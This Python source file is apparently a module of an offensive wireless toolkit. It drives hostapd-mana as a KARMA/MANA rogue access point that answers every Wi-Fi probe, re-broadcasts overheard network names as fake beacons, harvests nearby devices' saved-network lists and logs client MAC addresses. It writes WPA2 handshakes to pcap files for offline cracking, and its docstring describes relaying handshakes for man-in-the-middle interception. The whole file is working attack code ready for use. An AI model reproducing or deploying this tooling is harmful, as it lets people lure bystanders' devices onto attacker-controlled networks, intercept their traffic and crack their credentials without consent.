"""KARMA / MANA -- respond "yes, I'm that network" to every probe.

This module is the pure passive-aggressive attack: hostapd-mana runs
as an open AP and, for every ``Probe Request(SSID=X)`` any client
sends, replies with a ``Probe Response(SSID=X)``. The client believes
one of its remembered networks is in range and associates.

Two knobs:

* **Loud mode** (`mana_loud=1`) also *re-broadcasts* SSIDs as fake
  beacons once we've seen them in a probe, so the neighbours of the
  original prober pick them up too. Turns a single leaked PNL entry
  into a full beacon storm.
* **Sycophant** (companion tool ``wpa_sycophant``) if the target
  network is WPA2-PSK: the AP relays the 4-way handshake to the real
  network in real time, so the victim ends up as a plain MITM peer
  and we do not need to know the PSK.

Every probe seen and every association attempt is streamed into the
UI's live log; SSIDs are aggregated in a table so you can pick one
and *later* clone it deliberately from the Evil Twin module.
"""
from __future__ import annotations

import os
import re
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, toast

DEFAULT_IFACE = "wlan1"

# hostapd-mana prints "probe request from XX:XX:XX:XX:XX:XX for SSID <name>"
# style lines. There are a couple of variants across versions, so we
# match the SSID lazily with a broad regex.
_PROBE_RE = re.compile(
    r"probe request.*?from\s+([0-9a-f:]{17}).*?"
    r"(?:for(?: SSID)?|SSID:|SSID=)\s*['\"]?([^'\"\r\n]+?)['\"]?\s*$",
    re.IGNORECASE)

# hostapd association / assoc-request lines.
_ASSOC_RE = re.compile(
    r"(?:AP-STA-CONNECTED|assoc.*?from)\s+([0-9a-f:]{17})",
    re.IGNORECASE)

# hostapd config for mana in "open" + optional loud + PNL-only modes.
_HOSTAPD_MANA_TMPL = """interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
{security_lines}
mana_wifi=1
{mana_loud}
mana_macacl=0
{mana_wpaout}
"""


@register
class Karma(NHModule):
    title = "KARMA responder"
    icon = "network-wireless-hotspot-symbolic"
    description = ("Reply to every probe request with 'yes, I'm that "
                   "SSID'. Uses hostapd-mana; harvests the PNL of "
                   "every client in range.")
    required_tools = ["hostapd-mana"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._proc: Process | None = None
        # ssid -> {"count": n, "last_seen": ts, "clients": set(MAC)}
        self._probes: dict[str, dict] = {}
        self._client_macs: set[str] = set()
        self._assoc_count = 0
        self._pnl_rows: list[Adw.ActionRow] = []
        self._loot_id: int | None = None

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        cfg_group = Adw.PreferencesGroup(title="KARMA config")

        self.iface = Adw.EntryRow(title="AP interface")
        self.iface.set_text(DEFAULT_IFACE)
        cfg_group.add(self.iface)

        self.ssid = Adw.EntryRow(title="Base ESSID (fallback)")
        self.ssid.set_text("Free Wi-Fi")
        cfg_group.add(self.ssid)

        self.channel = Adw.SpinRow.new_with_range(1, 11, 1)
        self.channel.set_title("Channel")
        self.channel.set_value(6)
        cfg_group.add(self.channel)

        self.mode = Adw.ComboRow(title="Mode")
        self.mode.set_model(Gtk.StringList.new([
            "Open (accept any client, MITM upstream)",
            "WPA2-PSK (attract clients expecting encryption)",
        ]))
        cfg_group.add(self.mode)

        self.mode_psk = Adw.PasswordEntryRow(
            title="PSK (WPA2 mode)")
        self.mode_psk.set_text("welcome123")
        cfg_group.add(self.mode_psk)

        self.loud = Adw.SwitchRow(
            title="Loud mode",
            subtitle="Re-broadcast every SSID we hear as fake beacons")
        self.loud.set_active(True)
        cfg_group.add(self.loud)

        self.capture_handshakes = Adw.SwitchRow(
            title="Capture handshakes",
            subtitle="Write mana_wpaout pcap for offline crack "
                     "(WPA2 mode only)")
        self.capture_handshakes.set_active(True)
        cfg_group.add(self.capture_handshakes)

        run_row = Adw.ActionRow(
            title="Start / Stop KARMA",
            subtitle="Every probe seen appears below")
        self.start_btn = Gtk.Button(label="Start",
                                    valign=Gtk.Align.CENTER)
        self.start_btn.add_css_class("suggested-action")
        self.start_btn.connect("clicked", lambda _b: self._start())
        run_row.add_suffix(self.start_btn)
        self.stop_btn = Gtk.Button(label="Stop",
                                   valign=Gtk.Align.CENTER)
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked", lambda _b: self._stop())
        run_row.add_suffix(self.stop_btn)
        cfg_group.add(run_row)

        box.append(cfg_group)

        # ---- live stats
        stat_group = Adw.PreferencesGroup(title="Session")
        self.state_row = Adw.ActionRow(
            title="Status", subtitle="idle")
        stat_group.add(self.state_row)
        self.probe_count_row = Adw.ActionRow(
            title="Unique probes seen", subtitle="0")
        stat_group.add(self.probe_count_row)
        self.client_count_row = Adw.ActionRow(
            title="Unique clients heard", subtitle="0")
        stat_group.add(self.client_count_row)
        self.assoc_count_row = Adw.ActionRow(
            title="Clients that associated", subtitle="0")
        stat_group.add(self.assoc_count_row)
        box.append(stat_group)

        # ---- PNL harvested
        pnl_group = Adw.PreferencesGroup(
            title="Networks in clients' PNL",
            description="SSIDs we've seen probed. Click 'Clone' to "
                        "target one specifically from Evil Twin.")
        self._pnl_group = pnl_group
        self._pnl_empty = Adw.ActionRow(
            title="Waiting for probes…",
            subtitle="Start KARMA and wait for clients")
        pnl_group.add(self._pnl_empty)
        box.append(pnl_group)

        # ---- log
        self.output = OutputView()
        box.append(self.output)
        return box

    # ---------------------------------------------------------- start
    def _start(self) -> None:
        if self._proc is not None and self._proc.running:
            return
        iface = self.iface.get_text().strip() or DEFAULT_IFACE
        ssid = self.ssid.get_text().strip() or "Free Wi-Fi"
        ch = int(self.channel.get_value())

        # Reset counters and table.
        self._probes = {}
        self._client_macs = set()
        self._assoc_count = 0
        self._render_pnl()
        self.probe_count_row.set_subtitle("0")
        self.client_count_row.set_subtitle("0")
        self.assoc_count_row.set_subtitle("0")

        stamp = time.strftime("%Y%m%d-%H%M%S")
        pcap = None
        security_lines = ""
        if self.mode.get_selected() == 1:
            psk = self.mode_psk.get_text()
            if len(psk) < 8:
                psk = (psk + "!!!!!!!!")[:16]
            security_lines = (
                "wpa=2\n"
                "wpa_passphrase=%s\n"
                "wpa_key_mgmt=WPA-PSK\n"
                "wpa_pairwise=CCMP\n"
                "rsn_pairwise=CCMP\n") % psk
            if self.capture_handshakes.get_active():
                pcap = loot_path(
                    "karma", "karma-mana-%s.pcap" % stamp)

        log_path = loot_path(
            "karma", "karma-log-%s.log" % stamp)

        cfg = _HOSTAPD_MANA_TMPL.format(
            iface=iface, ssid=ssid, channel=ch,
            security_lines=security_lines,
            mana_loud=("mana_loud=1" if self.loud.get_active()
                       else "mana_loud=0"),
            mana_wpaout=("mana_wpaout=" + pcap) if pcap else "")
        conf = "/tmp/nhp-karma.conf"

        b64 = __import__("base64").b64encode(
            cfg.encode()).decode()
        run_async(
            ["sh", "-c",
             "printf '%s' | base64 -d > %s" % (b64, conf)],
            lambda _r: None, root=True, timeout=5)

        argv = ["hostapd-mana", "-K", conf]
        self.output.append("$ " + " ".join(argv) + "\n")
        self.output.append("--- config ---\n" + cfg + "---\n")

        # Two loot rows: one for the raw log, one for the pcap if
        # WPA2 mode captured handshakes.
        self._loot_id = get_loot_store().record(
            module="karma", type="karma_log",
            target=ssid, path=log_path,
            notes="KARMA session")
        if pcap:
            get_loot_store().record(
                module="karma", type="handshake_pcap",
                target=ssid + " (mana WPA2)", path=pcap,
                notes="hostapd-mana captured handshakes")

        def on_line(text: str) -> None:
            self.output.append(text)
            try:
                with open(log_path, "a") as fp:
                    fp.write(text)
            except OSError:
                pass
            # Learn from each line.
            for line in (text or "").splitlines():
                m = _PROBE_RE.search(line)
                if m:
                    mac = m.group(1).lower()
                    ssid_v = m.group(2)[:32]
                    if ssid_v and ssid_v != "\\x00":
                        d = self._probes.setdefault(
                            ssid_v, {"count": 0, "clients": set()})
                        d["count"] += 1
                        d["clients"].add(mac)
                        self._client_macs.add(mac)
                    continue
                a = _ASSOC_RE.search(line)
                if a:
                    self._client_macs.add(a.group(1).lower())
                    self._assoc_count += 1
            self._refresh_stats()

        def on_done(code: int) -> None:
            self.output.append("[hostapd-mana exited: %d]\n" % code)
            self._proc = None
            self.start_btn.set_sensitive(True)
            self.stop_btn.set_sensitive(False)
            self.state_row.set_subtitle("stopped")
            if self._loot_id is not None:
                get_loot_store().refresh_size(self._loot_id)

        self._proc = Process(
            argv, on_line, on_done, root=True)
        self._proc.start()
        self.start_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)
        self.state_row.set_subtitle("running")
        GLib.timeout_add_seconds(3, self._refresh_ui)

    def _stop(self) -> None:
        if self._proc is not None:
            self._proc.stop()
        self.stop_btn.set_sensitive(False)
        self.state_row.set_subtitle("stopping…")

    def _refresh_stats(self) -> None:
        self.probe_count_row.set_subtitle(str(len(self._probes)))
        self.client_count_row.set_subtitle(
            str(len(self._client_macs)))
        self.assoc_count_row.set_subtitle(str(self._assoc_count))

    def _refresh_ui(self) -> bool:
        # Re-render PNL rows every few seconds.
        if self._proc is None or not self._proc.running:
            return False
        self._render_pnl()
        return True

    def _render_pnl(self) -> None:
        # Remove old rows first. We keep at most 30 to avoid a scroll
        # marathon; the DB in the loot log has the full list anyway.
        for r in self._pnl_rows:
            self._pnl_group.remove(r)
        self._pnl_rows = []
        self._pnl_empty.set_visible(len(self._probes) == 0)
        top = sorted(self._probes.items(),
                     key=lambda kv: kv[1]["count"], reverse=True)[:30]
        for ssid, info in top:
            row = Adw.ActionRow(
                title=ssid,
                subtitle="%d probes · %d client(s)"
                        % (info["count"], len(info["clients"])))
            btn = Gtk.Button(label="Clone in Evil Twin",
                             valign=Gtk.Align.CENTER)
            btn.connect(
                "clicked",
                lambda _b, s=ssid: (
                    self.app_window.activate_module(
                        "evil_twin", s)))
            row.add_suffix(btn)
            self._pnl_group.add(row)
            self._pnl_rows.append(row)
